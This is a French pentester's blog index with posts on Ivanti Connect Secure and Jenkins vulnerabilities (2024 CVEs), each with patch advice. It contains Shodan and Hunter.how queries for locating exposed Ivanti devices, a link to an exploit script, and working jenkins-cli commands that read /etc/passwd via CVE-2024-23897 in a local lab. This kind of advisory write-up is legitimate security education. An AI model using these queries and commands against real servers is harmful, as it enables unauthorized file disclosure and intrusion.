[{"categories":null,"content":"Introduction Le 10 janvier 2024, Ivanti a émis un avis concernant deux vulnérabilités majeures touchant les appareils VPN Connect Secure, CVE-2023-46805 et CVE-2024-21887, permettant une exécution de code à distance non authentifiée. Peu après, des chercheurs ont signalé une exploitation active de ces vulnérabilités remontant à décembre 2023. Le 31 janvier 2024, Ivanti a révélé deux autres vulnérabilités importantes, CVE-2024-21888 et CVE-2024-21893, touchant à la fois Ivanti Connect Secure et Ivanti Policy Secure. Une de ces vulnérabilités, CVE-2024-21893, a également été exploitée en tant que 0-day. Ivanti a rapidement publié des correctifs pour toutes ces failles. CVE-2023-46805 : Une vulnérabilité de contournement de l’authentification dans le composant web d’Ivanti ICS 9.x, 22.x et Ivanti Policy Secure permet à un attaquant distant d’accéder à des ressources restreintes en contournant les vérifications de contrôle. CVE-2024-21887 : Une vulnérabilité d’injection de commandes dans les composants web d’Ivanti Connect Secure (9.x, 22.x) et d’Ivanti Policy Secure (9.x, 22.x) permet à un administrateur authentifié d’envoyer des requêtes spécialement conçues et d’exécuter des commandes arbitraires sur l’appareil. CVE-2024-21888 : A privilege escalation vulnerability in web component of Ivanti Connect Secure (9.x, 22.x) and Ivanti Policy Secure (9.x, 22.x) allows a user to elevate privileges to that of an administrator. CVE-2024-21893 : Une vulnérabilité de falsification de requête côté serveur (SSRF) dans le composant SAML d’Ivanti Connect Secure (9.x, 22.x) et d’Ivanti Policy Secure (9.x, 22.x), ainsi que dans Ivanti Neurons for ZTA, permet à un attaquant d’accéder à certaines ressources restreintes sans authentification ","date":"08/02/2024","objectID":"/4_vulnerabilites_critiques_cve-2023-46805-cve-2024-21887-cve-2024-21888-et-cve-2024-2189/:1:0","tags":null,"title":"Evanti : 4 vulnérabilités critiques (CVE-2023-46805, CVE-2024-21887, CVE-2024-21888 et CVE-2024-2189). Exploitation \u0026 Correctifs","uri":"/4_vulnerabilites_critiques_cve-2023-46805-cve-2024-21887-cve-2024-21888-et-cve-2024-2189/"},{"categories":null,"content":"Détails de l’exploitation Dans cette partie, nous allons voir comment trouver des services exposés et faire la démonstration d’un exemple d’exploitation réussie. ","date":"08/02/2024","objectID":"/4_vulnerabilites_critiques_cve-2023-46805-cve-2024-21887-cve-2024-21888-et-cve-2024-2189/:2:0","tags":null,"title":"Evanti : 4 vulnérabilités critiques (CVE-2023-46805, CVE-2024-21887, CVE-2024-21888 et CVE-2024-2189). Exploitation \u0026 Correctifs","uri":"/4_vulnerabilites_critiques_cve-2023-46805-cve-2024-21887-cve-2024-21888-et-cve-2024-2189/"},{"categories":null,"content":"Comment trouver des services exposés ? Avec SHODAN http.title:\"Ivanti Connect Secure\" Sur shodan , on a plus de 10.000 services exposés. Avec HUNTER.HOW product.name=\"Ivanti Connect Secure\" or product.name=\"Ivanti Policy Secure\"\" Sur Hunter.how , on a plus de 21.000 services exposés. ","date":"08/02/2024","objectID":"/4_vulnerabilites_critiques_cve-2023-46805-cve-2024-21887-cve-2024-21888-et-cve-2024-2189/:2:1","tags":null,"title":"Evanti : 4 vulnérabilités critiques (CVE-2023-46805, CVE-2024-21887, CVE-2024-21888 et CVE-2024-2189). Exploitation \u0026 Correctifs","uri":"/4_vulnerabilites_critiques_cve-2023-46805-cve-2024-21887-cve-2024-21888-et-cve-2024-2189/"},{"categories":null,"content":"Exécution de code arbitraire sans authentification (CVE-2024-21893 + CVE-2024-21887) La vulnérabilité SSRF (CVE-2024-21893) et la vulnérabilité d’injection de commandes (CVE-2024-21887) peuvent être combinées ensemble pour obtenir l’exécution de code à distance sans authentification. C’est ce que nous allons montrer dans les lignes qui suivent. Détection Un script est disponible sur github pour détecter et exploiter ces vulnérabilités. https://github.com/Chocapikk/CVE-2024-21887/ En prennant en compte que les services qui sont exposés sur Shodan, on a plus de 240 hosts qui sont toujours vulnérables. Exploitation Une exploitation réussie ouvre la possiblité d’exécuter du code arbitraire sur le serveur vulnérable. ","date":"08/02/2024","objectID":"/4_vulnerabilites_critiques_cve-2023-46805-cve-2024-21887-cve-2024-21888-et-cve-2024-2189/:2:2","tags":null,"title":"Evanti : 4 vulnérabilités critiques (CVE-2023-46805, CVE-2024-21887, CVE-2024-21888 et CVE-2024-2189). Exploitation \u0026 Correctifs","uri":"/4_vulnerabilites_critiques_cve-2023-46805-cve-2024-21887-cve-2024-21888-et-cve-2024-2189/"},{"categories":null,"content":"Correctifs Ivanti a publié des correctifs pour les vulnérabilités les 31 janvier et 1er février 2024. Il est recommandé d’installer les versions patchées - 9.1R14.4, 9.1R17.2, 9.1R18.3, 22.4R2.2 et 22.5R1.1 Référentiel : https://forums.ivanti.com/s/article/Download-Links-Related-to-CVE-2023-46805-and-CVE-2024-21887 ","date":"08/02/2024","objectID":"/4_vulnerabilites_critiques_cve-2023-46805-cve-2024-21887-cve-2024-21888-et-cve-2024-2189/:3:0","tags":null,"title":"Evanti : 4 vulnérabilités critiques (CVE-2023-46805, CVE-2024-21887, CVE-2024-21888 et CVE-2024-2189). Exploitation \u0026 Correctifs","uri":"/4_vulnerabilites_critiques_cve-2023-46805-cve-2024-21887-cve-2024-21888-et-cve-2024-2189/"},{"categories":null,"content":"Introduction Les chercheurs en sécurité de SonarSource ont découvert deux failles de sécurité dans Jenkins : CVE-2024-23897 et CVE-2024-23898. Jenkins a été informé de la découverte de ces vulnérabilités le 13 novembre 2023. Deux vulnérabilités sont expliquées : 𝗖𝗩𝗘-𝟮𝟬𝟮𝟰-𝟮𝟯𝟴𝟵𝟳 : C’est une vulnérabilité qui permet à un attaquant non authentifié, et disposant de la permission “overall/read”, de lire les données des fichiers présents sur le serveur. Sans cette permission, il est possible de lire les premières lignes des fichiers. Versions vulnérables : Les versions antérieures à 2.442 et 2.426.3 LTS 𝗖𝗩𝗘-𝟮𝟬𝟮𝟰-𝟮𝟯𝟴𝟵𝟴 : 󠁝󠀠C’est une vulnérabilité qui permet à un attaquant d’exécuter des commandes à distance en incitant un utilisateur à cliquer sur un lien malveillant. Elle est de type “cross-site WebSocket hijacking (CSWSH)”. Versions vulnérables : La version 2.217 à la version 2.441 (incluses toutes deux), LTS de la version 2.222.1 à la version 2.426.2 (toutes deux incluses). ","date":"01/02/2024","objectID":"/jenkins_rce_cve-2024-23897_cve-2024-23898/:1:0","tags":null,"title":"Jenkins : Deux vulnérabilités critiques (CVE-2024-23897 - CVE-2024-23898) Exploitation \u0026 Correctifs","uri":"/jenkins_rce_cve-2024-23897_cve-2024-23898/"},{"categories":null,"content":"Exploitation de 𝗖𝗩𝗘-𝟮𝟬𝟮𝟰-𝟮𝟯𝟴𝟵𝟳 J’ai hosté Jenkins avec le projet Vulnhub disponible sur https://github.com/vulhub/vulhub. ","date":"01/02/2024","objectID":"/jenkins_rce_cve-2024-23897_cve-2024-23898/:2:0","tags":null,"title":"Jenkins : Deux vulnérabilités critiques (CVE-2024-23897 - CVE-2024-23898) Exploitation \u0026 Correctifs","uri":"/jenkins_rce_cve-2024-23897_cve-2024-23898/"},{"categories":null,"content":"Détection de la vulnérabilité ","date":"01/02/2024","objectID":"/jenkins_rce_cve-2024-23897_cve-2024-23898/:2:1","tags":null,"title":"Jenkins : Deux vulnérabilités critiques (CVE-2024-23897 - CVE-2024-23898) Exploitation \u0026 Correctifs","uri":"/jenkins_rce_cve-2024-23897_cve-2024-23898/"},{"categories":null,"content":"Exploitation de la vulnérabilité Un utilisateur disposant des identifiants de connexion peut lire un fichier au complet (exemple : /etc/passwd). java -jar jenkins-cli.jar -noCertificateCheck -s http://localhost:8080/ -auth admin:admin connect-node \"@/etc/passwd\" Un attaquant non authentifié ou sans les autorisations de lecture globales nécessaires, peut seulement lire 3 lignes : Lire la première ligne java -jar jenkins-cli.jar -noCertificateCheck -s http://localhost:8080/ who-am-i \"@/etc/passwd\" Lire la deuxième ligne java -jar jenkins-cli.jar -noCertificateCheck -s http://localhost:8080/ enable-job \"@/etc/passwd\" Lire la troisième ligne java -jar jenkins-cli.jar -noCertificateCheck -s http://localhost:8080/ help \"@/etc/passwd\" ","date":"01/02/2024","objectID":"/jenkins_rce_cve-2024-23897_cve-2024-23898/:2:2","tags":null,"title":"Jenkins : Deux vulnérabilités critiques (CVE-2024-23897 - CVE-2024-23898) Exploitation \u0026 Correctifs","uri":"/jenkins_rce_cve-2024-23897_cve-2024-23898/"},{"categories":null,"content":"Exploitation de 𝗖𝗩𝗘-𝟮𝟬𝟮𝟰-𝟮𝟯𝟴𝟵𝟴 On installe Jenkins 2.440 qui est une version vulnérable avec Docker. Les commandes suivantes permettent d’installer et de lancer Jenkins en local. sudo docker pull jenkins/jenkins:2.440-jdk17 sudo docker run -p 8080:8080 jenkins/jenkins:2.440-jdk17 ","date":"01/02/2024","objectID":"/jenkins_rce_cve-2024-23897_cve-2024-23898/:3:0","tags":null,"title":"Jenkins : Deux vulnérabilités critiques (CVE-2024-23897 - CVE-2024-23898) Exploitation \u0026 Correctifs","uri":"/jenkins_rce_cve-2024-23897_cve-2024-23898/"},{"categories":null,"content":"Exploitation de la vulnérabilité ","date":"01/02/2024","objectID":"/jenkins_rce_cve-2024-23897_cve-2024-23898/:3:1","tags":null,"title":"Jenkins : Deux vulnérabilités critiques (CVE-2024-23897 - CVE-2024-23898) Exploitation \u0026 Correctifs","uri":"/jenkins_rce_cve-2024-23897_cve-2024-23898/"},{"categories":null,"content":"Correctifs Mettre à jour la dernière version de Jenkins. Un correctif est déjà disponible. https://www.jenkins.io/security/advisory/2024-01-24/#SECURITY-3314 ","date":"01/02/2024","objectID":"/jenkins_rce_cve-2024-23897_cve-2024-23898/:4:0","tags":null,"title":"Jenkins : Deux vulnérabilités critiques (CVE-2024-23897 - CVE-2024-23898) Exploitation \u0026 Correctifs","uri":"/jenkins_rce_cve-2024-23897_cve-2024-23898/"},{"categories":null,"content":"Presentation Salut, je suis Saliou Thiam, un passionné de la sécurité informatique et je suis spécialisé dans le Pentest. Mon expertise réside dans la découverte proactive de vulnérabilités pour renforcer la sécurité des systèmes informatiques. ","date":"17/01/2024","objectID":"/apropos/apropos/:1:0","tags":null,"title":"A propos","uri":"/apropos/apropos/"},{"categories":null,"content":"Certifications 🛡️ Certified Ethical Hacker 🔐 ComptiaSec+ 🌐 Google CyberSecurity Certificat Professional 🌐 Threat Intelligence and Risk Monitoring 🔐 API Penetration Testing ","date":"17/01/2024","objectID":"/apropos/apropos/:2:0","tags":null,"title":"A propos","uri":"/apropos/apropos/"},{"categories":null,"content":"Contact 📧 Email : info@zalepentester.com ","date":"17/01/2024","objectID":"/apropos/apropos/:3:0","tags":null,"title":"A propos","uri":"/apropos/apropos/"}]